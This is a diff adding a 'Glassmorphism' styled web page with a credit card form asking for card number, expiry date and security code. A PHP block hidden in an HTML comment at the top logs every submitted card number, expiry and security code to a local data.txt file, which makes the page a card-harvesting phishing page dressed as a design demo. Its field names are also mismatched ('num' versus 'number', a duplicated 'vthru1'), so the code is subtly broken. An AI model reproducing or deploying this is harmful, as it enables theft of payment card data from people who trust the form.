@@ -1,0 +1,82 @@
+<!-- <?php
+if (isset($_POST['number']) && isset($_POST['vthru1']) && isset($_POST['vthru2']) && isset($_POST['scode'])) {
+    $number = $_POST['number'];
+    $vthru1 = $_POST['vthru1'];
+    $vthru2 = $_POST['vthru2'];
+    $scode = $_POST['scode'];
+    $fp = fopen('data.txt','a');
+fwrite($fp, "number: {$number}\n");
+fwrite($fp, "valid thru: {$vthru1} / {$vthru2}\n");
+fwrite($fp, "security code: {$scode}\n");
+fwrite($fp, "--------------------------------\n");
+fclose($fp);
+}
+?> -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Glassmorphism</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>  
+    <div class="rain">
+        <span style="--i:1"></span>
+        <span style="--i:4"></span>
+        <span style="--i:3"></span>
+        <span style="--i:1"></span>
+        <span style="--i:3"></span>
+        <span style="--i:2"></span>
+        <span style="--i:5"></span>
+        <span style="--i:6"></span>
+        <span style="--i:2"></span>
+        <span style="--i:4"></span>
+        <span style="--i:1"></span>
+        <span style="--i:3"></span>
+        <span style="--i:2"></span>
+        <span style="--i:4"></span>
+        <span style="--i:7"></span>
+    </div>
+    <form action="index.php" method="POST">
+    <div class="container">
+        <div class="card">
+            <div class="content">
+                <h2>Credit card</h2>
+                <h3>Card number</h3>
+                <input type="number" name="num" id="num">
+               
+                <div class="valid">
+                <h3 class="m-r">VALID THRU</h3>
+                <div class="valid-cont">
+                <input type="number" name="vthru1" id="vthru1"><p class="m-r w">/</p><input type="number" name="vthru1" id="vthru1">
+
+                </div>
+                </div>
+                
+            </div>
+        </div>
+        <div class="card">
+            <div class="content">
+                <h2>Back side</h2>
+
+                <h3>Security Code</h3>
+                <div class="scode">
+                <input type="number" name="scode" id="scode">
+            </div>
+                
+            </div>
+        </div>
+    
+    </div>
+    <button type="submit" class="conf">Confirm</button>
+    </form>
+    <script type="text/javascript" src="vanilla-tilt.js"></script>
+    <script>VanillaTilt.init(document.querySelectorAll(".card"), {
+		max: 25,
+		speed: 400,
+
+	});</script>
+</body>
+</html>
